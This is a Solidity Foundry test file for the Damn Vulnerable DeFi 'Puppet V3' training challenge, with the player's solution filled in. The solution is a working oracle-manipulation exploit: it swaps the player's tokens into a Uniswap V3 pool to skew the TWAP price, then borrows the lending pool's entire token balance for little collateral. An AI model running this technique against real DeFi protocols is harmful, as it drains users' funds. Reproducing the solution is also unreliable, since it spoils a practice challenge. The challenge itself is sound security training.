// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract PuppetV3Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint24 constant FEE = 3000;

    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    INonfungiblePositionManager positionManager =
        INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    DamnValuableToken token;
    PuppetV3Pool lendingPool;

    uint256 initialBlockTimestamp;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Fork from mainnet state at specific block
        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);

        startHoax(deployer);

        // Set player's initial balance
        deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deployer wraps ETH in WETH
        weth.deposit{value: UNISWAP_INITIAL_WETH_LIQUIDITY}();

        // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
        token = new DamnValuableToken();

        // Create Uniswap v3 pool
        bool isWethFirst = address(weth) < address(token);
        address token0 = isWethFirst ? address(weth) : address(token);
        address token1 = isWethFirst ? address(token) : address(weth);
        positionManager.createAndInitializePoolIfNecessary({
            token0: token0,
            token1: token1,
            fee: FEE,
            sqrtPriceX96: _encodePriceSqrt(1, 1)
        });

        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
        uniswapPool.increaseObservationCardinalityNext(40);

        // Deployer adds liquidity at current price to Uniswap V3 exchange
        weth.approve(address(positionManager), type(uint256).max);
        token.approve(address(positionManager), type(uint256).max);
        positionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: token0,
                token1: token1,
                tickLower: -60,
                tickUpper: 60,
                fee: FEE,
                recipient: deployer,
                amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
                amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        // Deploy the lending pool
        lendingPool = new PuppetV3Pool(weth, token, uniswapPool);

        // Setup initial token balances of lending pool and player
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), LENDING_POOL_INITIAL_TOKEN_BALANCE);

        // Some time passes
        skip(3 days);

        initialBlockTimestamp = block.timestamp;

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertGt(initialBlockTimestamp, 0);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV3() public checkSolvedByPlayer {
        console.log("--- Inside test_puppetV3 ---");
        IUniswapV3Pool currentUniswapPool = lendingPool.uniswapV3Pool();
        (uint160 sqrtPriceX96Slot0Test,,,,,,) = currentUniswapPool.slot0();
        console.log("Current sqrtPriceX96 from slot0 (in test_puppetV3):", sqrtPriceX96Slot0Test);

        uint256 s_uint256_test = uint256(sqrtPriceX96Slot0Test);
        uint256 sqrt_P_ratio_x1e18_test = (s_uint256_test * 1e18) / (uint256(1) << 96);
        uint256 dvt_for_1_weth_test = (sqrt_P_ratio_x1e18_test * sqrt_P_ratio_x1e18_test) / 1e18;
        console.log("DVT for 1 WETH (scaled by 1e18) (in test_puppetV3):", dvt_for_1_weth_test);

        console.log("----------------------------");
        console.log("Player token balance:", token.balanceOf(player));
        console.log("Player WETH balance:", weth.balanceOf(player));
        console.log("Player ETH balance:", player.balance);
        console.log("----------------------------");

        // Log calculateDepositOfWETHRequired before swap
        uint256 wethRequiredBeforeSwap = lendingPool.calculateDepositOfWETHRequired(1e18); // for 1 DVT
        console.log("WETH required for 1 DVT (before swap):", wethRequiredBeforeSwap);
        console.log("----------------------------");

        // Define SwapRouter
        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

        // Approve DVT for SwapRouter
        uint256 amountToSwap = token.balanceOf(player);
        token.approve(address(swapRouter), amountToSwap);

        // Perform the swap: DVT for WETH
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: player,
            deadline: block.timestamp,
            amountIn: amountToSwap,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        swapRouter.exactInputSingle(params);

        console.log("--- After swap ---");
        console.log("Player token balance:", token.balanceOf(player));
        console.log("Player WETH balance:", weth.balanceOf(player));
        (sqrtPriceX96Slot0Test,,,,,,) = currentUniswapPool.slot0();
        console.log("New sqrtPriceX96 from slot0:", sqrtPriceX96Slot0Test);
        s_uint256_test = uint256(sqrtPriceX96Slot0Test);
        sqrt_P_ratio_x1e18_test = (s_uint256_test * 1e18) / (uint256(1) << 96);
        dvt_for_1_weth_test = (sqrt_P_ratio_x1e18_test * sqrt_P_ratio_x1e18_test) / 1e18;
        console.log("New DVT for 1 WETH (scaled by 1e18):", dvt_for_1_weth_test);
        
        // Log calculateDepositOfWETHRequired immediately after swap (oracle not yet updated for TWAP)
        uint256 wethRequiredPostSwapImmediate = lendingPool.calculateDepositOfWETHRequired(1e18);
        console.log("WETH required for 1 DVT (after swap, pre-TWAP update):", wethRequiredPostSwapImmediate);

        // Advance as long as we can to update
        vm.warp(block.timestamp + 114);

        // Log calculateDepositOfWETHRequired after swap and TWAP update
        uint256 wethRequiredAfterSwapAndTwap = lendingPool.calculateDepositOfWETHRequired(1e18);
        console.log("WETH required for 1 DVT (after swap, post-TWAP update):", wethRequiredAfterSwapAndTwap);
        console.log("----------------------------");

        // Calculate WETH needed to borrow all DVT from the lending pool
        uint256 dvtInLendingPool = token.balanceOf(address(lendingPool)); // This is LENDING_POOL_INITIAL_TOKEN_BALANCE
        console.log("DVT in lending pool to borrow:", dvtInLendingPool);
        uint256 wethToBorrowAllDvt = lendingPool.calculateDepositOfWETHRequired(dvtInLendingPool);
        console.log("WETH required to borrow all DVT from lending pool:", wethToBorrowAllDvt);
        
        uint256 playerWethBalance = weth.balanceOf(player);
        console.log("Player WETH balance (before borrow):", playerWethBalance);
        console.log("----------------------------");

        // Player borrows all DVT from the lending pool
        if (playerWethBalance >= wethToBorrowAllDvt) {
            console.log("Player has enough WETH to borrow all DVT.");
            // Approve lendingPool to spend player's WETH
            weth.approve(address(lendingPool), wethToBorrowAllDvt);
            
            // Borrow DVT
            console.log("Attempting to borrow", dvtInLendingPool, "DVT...");
            lendingPool.borrow(dvtInLendingPool);
            
            console.log("--- After borrowing DVT ---");
            console.log("Player DVT balance:", token.balanceOf(player));
            console.log("Player WETH balance:", weth.balanceOf(player));
            console.log("Lending Pool DVT balance:", token.balanceOf(address(lendingPool)));
            console.log("----------------------------");
            token.transfer(recovery, dvtInLendingPool);
        } else {
            console.log("Player does NOT have enough WETH to borrow all DVT.");
            console.log("Needed:", wethToBorrowAllDvt, "Has:", playerWethBalance);
            console.log("----------------------------");
        }
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }

    function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
        return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
    }
}
